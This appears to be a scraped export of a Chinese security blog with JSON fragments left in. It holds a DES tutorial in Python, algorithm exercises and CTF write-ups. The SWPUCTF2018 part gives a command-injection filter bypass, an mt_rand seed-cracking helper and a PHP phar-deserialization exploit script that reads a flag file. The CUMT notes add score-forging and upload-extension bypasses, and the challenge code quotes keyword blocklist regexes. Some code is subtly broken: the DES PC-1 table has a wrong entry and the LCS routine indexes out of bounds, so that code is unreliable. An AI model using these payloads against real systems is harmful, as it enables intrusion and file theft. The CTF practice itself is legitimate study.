从对古典密码分析中可以看到，一个密码体系要保证安全性，应该尽可能的隐藏语言特性，即密文均匀分布，且加密的可选字符区间应尽可能的大，否则无法抵抗穷举攻击。在现代密码体制中，这两点都有了比较好的保证。 分组密码DES加密算法DES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。 明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。 DES加密流程如下图 解密时只需要将机密流程逆序即可。 算法大致步骤如下： 初始置换 ​DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。初始置换规则可查表获得，这里不再赘述。初始置换是固定的、公开的函数，因此这个初始置换及逆初始置换都没有密码意义，主要目的是为了更好地将明文和密文分组。 下一步是进行轮函数（F函数）迭代，F函数具体步骤如下 扩展置换（E盒） 初始置换结束后，将得到64位序列分成两组，各32位，而E盒将数据的右32位输入扩展为48位输出，改变了位的次序，重复了某些位。 该步骤的目的是：a、产生与秘钥相同长度的数据以进行异或运算，R0是32位，子秘钥是48位，所以R0要先进行扩展置换之后与子秘钥进行异或运算；b、提供更长的结果，使得在替代运算时能够进行压缩。 秘钥加运算 该步骤非常简单，将E扩展输出的48位与48位子秘钥进行逐位异或，输出48位数据。 代换盒（S盒） 此步骤的功能是进行非线性变换，S盒是DES中唯一的非线性部分，经过S盒代换压缩之后，48位的数据重新被压缩成32位。 代换压缩由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果 S盒具有良好的非线性，输入的每一个比特与全部输入比特有关，两个输入相差1比特时，输入至少相差2比特，极大的保证了安全性。 置换运算（P盒） 置换运算（P盒）只是进行简单位置置换，而不进行扩展和压缩。 至此F函数结束 逆置换 将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为F函数。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249import sysimport binasciiip = [57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23,15, 7, 56, 48, 40, 32, 24, 16, 8, 0, 58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6]# 逆矩阵_ip = [39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25, 32, 0, 40, 8, 48, 16, 56, 24]# 初始化c、d数组c = [\"\"]*17d = [\"\"]*17k = [\"\"]*17# 左右32位数组l = [\"\"]*17r = [\"\"]*17def generate_secretkey(key, round): pc1 = [56, 48, 40, 32, 24, 16, 8, 0, 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 60, 52, 4, 36, 28, 20, 12, 4, 27, 19, 11, 3] respc1 = \"\" for i in range(56): respc1 += key[pc1[i]] c[0] = respc1[:28] d[0] = respc1[28:] k[0] = c[0] + d[0] for i in range(1,round+1): if i in (1,2,9,16): # 左移1位 c[i] = c[i-1][1:] + c[i-1][:1] d[i] = d[i-1][1:] + d[i-1][:1] else: c[i] = c[i-1][2:] + c[i-1][:2] d[i] = d[i-1][2:] + d[i-1][:2] secret = c[round] + d[round] pc2 = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8, 16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48, 44,49,39,56,34,53,46,42,50,36,29,32] s_key = \"\" # 生成本轮最终秘钥 for i in range(48): s_key += secret[pc2[i]-1] return s_key# 初始置换，输入为64位数据，8个ascii字符def init_replace(data): re = \"\" for i in range(64): re += data[ip[i]] return re# 扩展置换，输入为32位数据，输出为48位数据def e_replace(data): e_box = [31, 0, 1, 2, 3, 4, 3, 4, 5, 6, 7, 8, 7, 8, 9, 10, 11, 12, 11, 12, 13, 14, 15, 16, 15, 16, 17, 18, 19, 20, 19, 20, 21, 22, 23, 24, 23, 24, 25, 26, 27, 28, 27, 28, 29, 30, 31, 0] re = ['a'] * 48 for i in range(48): re[i] = data[e_box[i]] return re# 秘钥加处理def secret_plus(data, key): out = \"\" for i in range(48): out += str(int(data[i])^int(key[i])) return out# s盒置换，输入48位，输出32位def s_replace(data): s1 = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7], [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8], [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0], [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]] s2 = [[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10], [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5], [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15], [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9]] s3 = [[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8], [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1], [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7], [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12]] s4 = [[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15], [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9], [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4], [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14]] s5 = [[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9], [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6], [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14], [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3]] s6 = [[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11], [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8], [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6], [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13]] s7 = [[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1], [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6], [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2], [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12]] s8 = [[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7], [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2], [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8], [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]] re = [] for i in range(48//6): re.append(data[6*i:6*i+6]) # 开始进行s盒置换 dic = [s1,s2,s3,s4,s5,s6,s7,s8] retn = \"\" for i in range(8): r = int(re[i][0] + re[i][5],2) c = int(re[i][1:5], 2) temp = str(bin(dic[i][r][c]))[2:] temp = \"0\"*(4-len(temp)) + temp retn += temp # print(len(retn)) return retn# p盒置换，输入输出均为32位def p_replace(data): p = [15, 6, 19, 20, 28, 11, 27, 16, 0, 14, 22, 25, 4, 17, 30, 9, 1, 7, 23, 13, 31, 26, 2, 8, 18, 12, 29, 5, 21, 10, 3, 24] re = \"\" for i in range(32): re += data[p[i]] return re# F函数，32位数据，子秘钥，轮数def f_function(data, key, round): cipher = data # 左侧32位 cipher = e_replace(cipher) cipher = secret_plus(cipher, key) cipher = s_replace(cipher) cipher = p_replace(cipher) return cipherdef convert_key_bin(key): word = key key = \"\" for i in word: key += f'&#123;bin(ord(i))[2:]:0&gt;8&#125;' return key# 终极加密函数，参数为秘钥和明文(明文暂时测试为64位以内)def des_encrypt(ptext, key): for i in range(17): l[i] = \"\" r[i] = \"\" key = convert_key_bin(key) cipher = init_replace(ptext) l[0] = cipher[0:32] r[0] = cipher[32:] # 进行16层循环 for i in range(1,16): l[i] = r[i-1] secret_key = generate_secretkey(key,i) # 生成子秘钥 f_result = f_function(r[i-1],secret_key,i) for j in range(32): r[i] += str(int(l[i-1][j])^int(f_result[j])) secret_key = generate_secretkey(key,16) f_result = f_function(r[15],secret_key,16) l[16] = \"\" for j in range(32): l[16] += str(int(l[15][j])^int(f_result[j])) r[16] = r[15] temp = l[16] + r[16] final_cipher = \"\" for i in range(64): final_cipher += temp[_ip[i]] return f'&#123;hex(int(final_cipher,2))[2:]:0&gt;16&#125;'def des_decrypt(cipher,key): for i in range(17): l[i] = \"\" r[i] = \"\" # 恢复为64位密文 key = convert_key_bin(key) temp = bin(int(cipher, 16))[2:] cipher = \"0\"*(64-len(temp)) + temp cipher = init_replace(cipher) l[16] = cipher[:32] r[16] = cipher[32:] for i in range(16,1,-1): l[i-1] = r[i] secret_key = generate_secretkey(key,i) # 生成子秘钥 f_result = f_function(r[i],secret_key,i) r[i-1] = \"\" for j in range(32): r[i-1] += str(int(l[i][j])^int(f_result[j])) r[0] = r[1] secret_key = generate_secretkey(key,1) l[0] = \"\" f_result = f_function(r[1],secret_key,1) for j in range(32): l[0] += str(int(l[1][j])^int(f_result[j])) temp = l[0] + r[0] bintext = \"\" for i in range(64): bintext += temp[_ip[i]] plaintext = \"\" for i in range(8): plaintext += chr(int(bintext[8*i:8*i+8],2)) return plaintextdef str2bin(text): if len(text) % 8 != 0: text = text + \" \"*(8-(len(text)%8)) binplain = \"\" for i in text: binplain += '&#123;:0&gt;8&#125;'.format(bin(ord(i))[2:]) return binplaindef encrypt(text, key): longbinplain = str2bin(text) group_plain = \"\" longcipher = \"\" for i in range(len(longbinplain)//64): group_plain = \"\" group_plain = longbinplain[64*i:64*i+64] longcipher += des_encrypt(group_plain,key) return longcipher def decrypt(cipher,key): plaintext = \"\" for i in range(len(cipher)//16): plaintext += des_decrypt(cipher[16*i:16*i+16], key) return plaintext.rstrip()if __name__ == '__main__': mode = sys.argv[1] while mode in (\"e\",\"d\"): data = input(\"Plz input data: \") key = str(input(\"Plz input key: \")) if mode == \"e\": ans = encrypt(data, key) print(ans) elif mode == \"d\": ans = decrypt(data, key) print(ans) mode = input(\"quit or continue?\\n\") 为了增强通用性，增加代码重用性，该算法使用了包封装，从而使其能够被其它程序重用。该DES支持短信息加密，也支持长消息加密。为了使密文便于显示和存储转化为16进制显示 实例演示： 安全性分析 ​ DES算法具有极高的安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。 而56位长的密钥的穷举空间为2^56，这意味着如果一台计算机的速度是每一秒钟检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的。然而，这并不等于说DES是不可破解的。而实际上，随着硬件技术和Internet的发展，其破解的可能性越来越大，而且，所需要的时间越来越少。使用经过特殊设计的硬件并行处理要几个小时。 ​ 由DES算法的密钥生成步骤中我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、……64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，……64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，……64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，….. .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。 ​ 此外，由于DES算法各轮（F函数）的子密钥是通过改变初始密钥这种方式得到的，因此有些初始密钥成了弱密钥（weakkey）。初始密钥分成两部分，每部分各自独立的移动。如果每一部分的所有位都是0或1，那么算法的任意一个周期的密钥都是相同的。当密钥是全1、全0、或者一半全1、一半全0时，会发生这种情况。所以我们在选择密钥时要进行检查，以防止产生弱密钥。 ​ 随着密码学的发展，差分分析和线性分析的发展对分组密码的安全性构成了挑战，也推动了分组密码设计技术的发展。 ​ 随着计算机计算能力的提高与密码分析技术的进步，DES的密钥长度已经被证明不能够满足当前安全性能的需求，为了克服DES密钥空间小的缺陷，人们又提出了三重DES的变形形式，即使用多个不同的DES秘钥利用DES算法对明文进行多次加密，这样可以增加密钥量。 算法实用性分析 ​ DES算法拥有着良好的安全性，目前最有效的破解方法依然是穷举攻击，所以在一些安全性要求相对不高的情况下可以使用DES算法，此外，由于DES的广泛的使用量，为了充分利用有关DES的软硬件资源，可以使用DES的改进算法如三重DES算法等。 ​ 由于DES算法要进行多轮迭代，所以DES的运算速度相对较慢，此外，密码生命周期也比较短。 ​ 分组密码与序列密码相比，具有扩散性好，插入敏感等优点，缺点是加解密处理速度慢、存在错误传播。用途上，在对于处理数据分组的应用，比如文件传递、电子邮件，分组密码非常合适。","categories":[{"name":"Record","slug":"Record","permalink":"http://chaosec.top/categories/Record/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://chaosec.top/tags/Crypto/"}]},{"title":"简单算法记录","slug":"suanfa","date":"2019-01-01T08:45:12.000Z","updated":"2019-01-30T12:26:10.697Z","comments":true,"path":"2019/01/01/suanfa/","link":"","permalink":"http://chaosec.top/2019/01/01/suanfa/","excerpt":"前言最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下","text":"前言最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下 动态规划最长公共子序列 题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=是序列X=的一个子序列，Z中的元素在X中的下标序列为。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 最长公共子序列问题，递推公式为 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;string x;string y;int b[105][105],c[105][105];void LCSLength(int m, int n)&#123; for(int i=0;i&lt;=m;i++) c[i][0] = 0; for(int i=0;i&lt;=n;i++) c[0][i] = 0; for(int i=0;i&lt;m;i++) for(int j=0;j&lt;n;j++)&#123; if(x[i]==y[j])&#123; c[i][j] = c[i-1][j-1] + 1; b[i][j] = 1; &#125;else if(c[i-1][j]&gt;c[i][j-1])&#123; c[i][j] = c[i-1][j]; b[i][j] = 2; &#125;else&#123; c[i][j] = c[i][j-1]; b[i][j] = 3; &#125; &#125;&#125;//寻找最优解void traceback(int i,int j)&#123; if(i==-1||j==-1) return; if(b[i][j]==1)&#123; cout&lt;&lt;x[i]; traceback(i-1,j-1); &#125; else if(b[i][j]==2) traceback(i-1,j); else traceback(i,j-1);&#125;int main()&#123; while(cin&gt;&gt;x&gt;&gt;y)&#123; int a = x.length(); int b = y.length(); LCSLength(a,b); cout&lt;&lt;c[a-1][b-1]&lt;&lt;endl; traceback(a-1, b-1); cout&lt;&lt;endl; &#125; return 0;&#125; 最大字段和 题目描述给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。接下来一行有n个数x(-1000&lt;=x&lt;=1000)。 输出输出其对应的最大子段和。 递推公式 1b[i] = max&#123;b[i-1]+a[i], a[i]&#125; (1≤i≤n) 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;iostream&gt;int num[10005];using namespace std;//再给出输出最优解的方法int temp_start,len;int besti,bestj;void get_res()&#123; for(int i=besti;i&lt;bestj;i++)&#123; cout&lt;&lt;num[i]&lt;&lt;\" \"; &#125; cout&lt;&lt;endl;&#125;int main()&#123; int t,n; int b = 0; int ans =0; cin&gt;&gt;t; while(t&gt;0)&#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++)&#123; cin&gt;&gt;num[i]; &#125; temp_start = 0; len = 1; for(int i=0;i&lt;n;i++)&#123; if(b&gt;0)&#123; b = b + num[i]; len++; &#125;else&#123; b = num[i]; temp_start = i; len = 1; &#125; if(ans &lt; b)&#123; ans = b; besti = temp_start; bestj = temp_start + len; &#125; &#125; cout&lt;&lt;ans&lt;&lt;endl; //get_res(); t--; &#125; return 0;&#125; 矩阵连乘待续 0-1背包 题目描述已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。 接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围） 输出对每组测试数据，输出其对应的所装物品的最大价值。 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int c,n;int x[1005];long w[1005];long v[1005];long long m[1005][10005];//数组长度要开的合适一点void pack()&#123; for(int i=0;i&lt;w[n];i++) m[n][i] = 0; for(int i=w[n];i&lt;=c;i++) m[n][i] = v[n]; for(int i=n-1;i&gt;0;i--)&#123; for(int j=0;j&lt;w[i];j++) m[i][j] = m[i+1][j]; for(int j=w[i];j&lt;=c;j++)&#123; m[i][j] = max(m[i+1][j],m[i+1][j-w[i]]+v[i]); &#125; &#125;&#125;//利用m的下标的意义来构造最优解 void traceback()&#123; for(int i=1;i&lt;=n;i++)&#123; if(m[i][c]!=m[i+1][c])&#123; cout&lt;&lt;i&lt;&lt;\" \"; c -= w[i]; &#125; &#125; cout&lt;&lt;endl;&#125; int main()&#123; int t; cin&gt;&gt;t; while(t--)&#123; cin&gt;&gt;c&gt;&gt;n; for(int i=1;i&lt;=n;i++) cin&gt;&gt;w[i]&gt;&gt;v[i]; pack(); cout&lt;&lt;m[1][c]&lt;&lt;endl; //traceback(); &#125; return 0;&#125;","categories":[{"name":"Record","slug":"Record","permalink":"http://chaosec.top/categories/Record/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://chaosec.top/tags/Algorithm/"}]},{"title":"SWPUCTF2018复现","slug":"SWPUCTF2018","date":"2018-12-20T05:00:25.000Z","updated":"2019-02-16T08:30:36.955Z","comments":true,"path":"2018/12/20/SWPUCTF2018/","link":"","permalink":"http://chaosec.top/2018/12/20/SWPUCTF2018/","excerpt":"题目复现","text":"题目复现 MISC其它两道都很简单，就不记录了，只记录一下没做出来的 唯有低头,才能出头做的时候知道是键盘加密，但是对于数字理解错误了，我以为是手机键盘的九键加密…，所以走远了，记录一下这种加密方法，对应于键盘的盲打手势对应字母 1299 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33lookatthekeyboard WEB用优惠码 买个 X?注册并登录之后，页面弹出一个优惠码 uKnfZ2F0aFaZBFy ，但是输入之后却失效，要求我们输入24位的优惠码，题目存在文件泄露 www.zip，下载源码 123456789101112131415161718192021222324252627&lt;?php//生成优惠码$_SESSION['seed']=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION['seed']); $str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $auth=''; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie('Auth', $auth);&#125;//support if (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip))&#123; if (!preg_match(\"/\\?|flag|&#125;|cat|echo|\\*/i\",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125;?&gt; 可以看出题目使用了md_srand()函数来产生随机数，而PHP中产生的是伪随机数，即只要我们知道种子的话，那么后续产生的随机数我们也就都可以知道，所以现在就是要爆破随机数种子，可以用php_me_seed工具来爆破，速度快一些，但是我们要先将数据处理为该工具能够识别的输入参数 123456789101112$pass = \"b1o2OrrgqYPMkzK\";$str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$len = strlen($str_rand) -1;for ($i=0; $i&lt;strlen($pass); $i++)&#123; if($i&lt;=(15/2))&#123; $number = strpos($str_rand,$pass[i]); echo \"$number $number 0 $len\"; &#125;else&#123; $number = $len + 1 - strpos($str_rand,$pass[i]); echo \"$number $number 0 $len\"; &#125;&#125; 这样可以得到我们爆破的种子 然后用该种子来生成24位的优惠码（这儿当时想不通哪来的24位，原来就是把代码中长度15改为24就可以了Orz）,此时注意php版本不同的话相同的种子也会产生不同的序列，看网站响应头可知该网站php版本为7.2，所以用对应版本生成优惠码即可 然后就是后半段的命令执行绕过了 12345678910//support if (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip))&#123; if (!preg_match(\"/\\?|flag|&#125;|cat|echo|\\*/i\",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125; 对于第一个首尾匹配直接 %0a 换行即可绕过，第二个过滤了通配符，flag字段，可以用单引号绕过，cat命令不能用了就用tail命令即可 1ip=1.1.1.1%0atail /&apos;fl&apos;ag 方方土学长用的是\\绕过，原理是反斜杠会转义特殊字符，而如果字符不是shell特殊字符的话则不转义 1ip=1.1.1.1%0atail /fl\\ag SimplePHP查看文件出存在文件读取漏洞，利用该漏洞读取文件源码， 1http://120.79.158.180:11115/file.php?file=index.php 关键源码如下 function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) &#123; //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; &#125; &#125; &#125; ?&gt; file.php 1234567891011121314151617&lt;?php header(\"content-type:text/html;charset=utf-8\"); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); $file = $_GET[\"file\"] ? $_GET['file'] : \"\"; if(empty($file)) &#123; echo \"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\"; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die('file doesn\\'t exists.'); &#125; ?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) &#123; echo \"hacker~\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = \"index.php\"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; 看到出现了类，思路就基本上是php反序列化了，但是代码中并没有反序列化函数的调用，但是在file.php中看到存在file_exists()函数，该函数是可以通过phar协议实现反序列化的参考文章，接下里的思路就是构造pop链，题目中有提示 &lt;!--flag is in f1ag.php--&gt; ，所以要尝试读取f1ag.php文件 在Show类的show方法中过滤了f1ag字段，那么这个方法应该不行，看了大佬的pop链构造思路，Test类中有file_get_contents()函数可以读取文件内容，所以可以尝试反序列化Test类，file_get()方法被get方法调用，而get方法是被get()魔术方法调用 当读取不可访问属性的值时，__get() 会被调用。也就是，当想要获取一个类的私有属性，或者获取一个类并为定义的属性时。该魔术方法会被调用。 可以看到我们需要访问一个不可访问的变量，在Show中的toString()方法中，运行了 $content = $this-&gt;str[&#39;str&#39;]-&gt;source;，该语句会访问不存在的变量source，所以接下来就是要触发toString()方法，正好在C1e4r类中destruct()类中 echo $this-&gt;test; 则会触发toString()方法，至此pop链构造完成: 12341.C1e4r类的__destruct()中的echo $this-&gt;test;2.Show中的__toString()中的$content = $this-&gt;str[&apos;str&apos;]-&gt;source;3.Test中的__get()方法4.利用file_get_contens()读文件 1234567891011121314$a = new Test();$a-&gt;params = array(\"source\"=&gt;'/var/www/html/f1ag.php');$b = new Show('index.php');$b-&gt;str['str'] = $a;$c= new C1e4r($b);echo serialize($c);$obj = unserialize('O:5:\"C1e4r\":2:&#123;s:4:\"test\";N;s:3:\"str\";O:4:\"Show\":2:&#123;s:6:\"source\";s:9:\"index.php\";s:3:\"str\";a:1:&#123;s:3:\"str\";O:4:\"Test\":2:&#123;s:4:\"file\";N;s:6:\"params\";a:1:&#123;s:6:\"source\";s:22:\"/var/www/html/f1ag.php\";&#125;&#125;&#125;&#125;&#125;');$phar = new Phar('exploit.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.php', 'test');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');$phar-&gt;setMetadata($obj);$phar-&gt;stopBuffering();rename('exploit.phar', 'skyfuck.gif'); 然后提交即可 1phar://upload/680b7502eaac53cac3f3eca74d50f537.jpg","categories":[{"name":"复现","slug":"复现","permalink":"http://chaosec.top/categories/复现/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://chaosec.top/tags/Web/"},{"name":"Misc","slug":"Misc","permalink":"http://chaosec.top/tags/Misc/"}]},{"title":"CUMT网络安全实训平台题目记录","slug":"cumtctf","date":"2018-12-07T15:55:48.000Z","updated":"2019-01-31T04:28:04.010Z","comments":true,"path":"2018/12/07/cumtctf/","link":"","permalink":"http://chaosec.top/2018/12/07/cumtctf/","excerpt":"CUMT网络安全实训平台题目记录","text":"CUMT网络安全实训平台题目记录 WEB源代码查看源代码，在最后发现一段字符 1&lt;!--该f配l合a你g演&#123;出y的o我u演f视i而n不d见m别e逼2一3个3最3爱3你3的3人3即3兴3表3演&#125;--&gt; 提取出字符即可得到flag colorSnake前端题目，一头雾水，看了别人的wp，查看源代码在页面地段可以看到有一个game.js，跟过去看一下， 123456789xhr('./getScore.php',function(e)&#123; var r = JSON.parse(e); if(r.state == 200) game.addScore(r.score); else&#123; alert(r.msg); game.start() &#125; &#125;) 尝试在控制台提交 123456789setInterval(function()&#123;xhr(&apos;./getScore.php&apos;,function(e)&#123; var r = JSON.parse(e); if(r.state == 200) game.addScore(r.score); else&#123; alert(r.msg); game.start() &#125; &#125;)&#125;,1) 会发现id确实增加了，我们可以通过修改参数使它实现多次递增从而达到50分，最终payload 123456789setInterval(function()&#123;xhr(&apos;./getScore.php&apos;,function(e)&#123; var r = JSON.parse(e); if(r.state == 200) game.addScore(r.score); else&#123; alert(r.msg); game.start() &#125; &#125;)&#125;,1000) 备份题目给出了信息 1.bak 2.bak There are too much baks in the website ,can you find the flag in these baks? 尝试访问1.bak，2.bak，没有发现flag，继续访问3.bak，4.bak等都存在文件，只是没有flag，猜测flag应该在某个*.bak，中，bp爆破一下，在998.bak中发现了flag 上传一题目要求上传jpg后缀，写一个PHP文件修改后缀为jpg，之后抓包修改文件名后缀为PHP再发包（因为它是在前端验证文件是否合法） 